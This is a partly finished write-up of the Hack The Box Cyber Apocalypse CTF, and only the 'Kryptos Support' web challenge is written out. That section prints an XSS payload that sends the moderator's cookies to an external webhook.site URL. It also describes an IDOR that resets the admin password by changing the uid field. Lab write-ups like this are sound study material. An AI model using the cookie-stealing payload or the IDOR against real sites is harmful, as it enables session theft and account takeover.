# Hack The Box - Cyber Apocalypse

A CTF Hosted by Hack The Box which lasted 5 days. I ranked 245th out of more than 7000 teams.

------------

- [Pwn](#pwn)
	-  [Space Pirate: Entrypoint](#pwn1 "Space Pirate: Entrypoint")
	-  [Space pirate: Going Deeper](#pwn2)
	-  [Space pirate: Retribution](#pwn3)
	-  [Vault-breaker](#pwn4)
	-  [Fleet Management](#pwn5)
	-  [Hellbound](#pwn6)
	-  [Trick or Deal](#pwn7)
- [Web](#web)
	-  [Kryptos Support](#web1)
	-  [BlinkerFluids](#web2)
	-  [Amidst Us](#web3)
	-  [Intergalactic Post](#web4)
	-  [Acnologia Portal](#web5)
	-  [Red Island](#web6)
	-  [Mutation Lab](#web7)
- [Rev](#rev)
	-  [WIDE](#rev1)
- [Misc](#misc)
	-  [Compressor](#misc1)

------------

### Pwn
1. <p name="pwn1">Space Pirate: Entrypoint</p>

2. <p name="pwn2">Space Pirate: Going Deeper</p>

3. <p name="pwn3">Space pirate: Retribution</p>

4. <p name="pwn4">Vault-breaker</p>

5. <p name="pwn5">Fleet Management</p>

6. <p name="pwn6">Hellbound</p>

7. <p name="pwn7">Trick or Deal</p>


### Web
1. <p name="web1">Kryptos Support</p>
For this challenge we were given a website with a `/login` & `/signup` pages. Upon signing up, we get the following page:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/kryptossupport_web1.png'>
</p>

So, this should be a basic XSS since we didn't even get a source code. Going for a basic payload:

```html
<script>
    fetch('https://webhook.site/a02af4ea-d61b-440d-9982-c3804fd1587a?q='+document.cookie);
</script>
```

Gives us the moderator's cookies! Having a look on them, we see a session cookie. We add the session & we visit `/settings`. The magic happens & we are logged in. We see that we have two fields used for changing the current user password & there is no current password confirmation but there is no flag yet? We apparently need to access something higher, maybe an admin account? So we try the change password functionality & we have a look on the HTTP Request. We see that we are sending the UID in the request body:

```json
{
    "password": "hellothere",
    "uid": "100"
}
```

Trying to find the admin ID, we change the UID to 1 & send our HTTP Request. We get a confirmation from the server:

```json
{
    "message": "Password for admin changed successfully!"
}
```

We login as the admin now & we get our flag: `HTB{x55_4nd_id0rs_ar3_fun!!}`

2. <p name="web2">BlinkerFluids</p>

3. <p name="web3">Amidst Us</p>

4. <p name="web4">Intergalactic Post</p>

5. <p name="web5">Acnologia Portal</p>

6. <p name="web6">Red Island</p>

7. <p name="web7">Mutation Lab</p>

### Rev
1. <p name="rev1">WIDE</p>

### Misc
1. <p name="misc1">Compressor</p>


WIP